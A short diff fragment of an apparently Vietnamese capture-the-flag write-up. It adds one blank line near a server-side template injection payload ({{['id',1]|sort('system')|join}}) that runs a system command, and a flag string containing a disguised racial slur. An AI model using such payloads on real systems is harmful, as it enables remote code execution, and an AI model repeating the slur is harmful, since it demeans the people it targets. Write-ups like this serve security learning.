@@ -208,6 +208,7 @@ Và sau khi tiếp tục research tìm được payload để RCE như sau:
 ```
 {{['id',1]|sort('system')|join}}
 ```
+
 #### Flag: FUSec{Nic3_B1g_n1GG4_w1ll_Pr0t3ct_y0U}
 
 ## [WEB] EHC social network 1
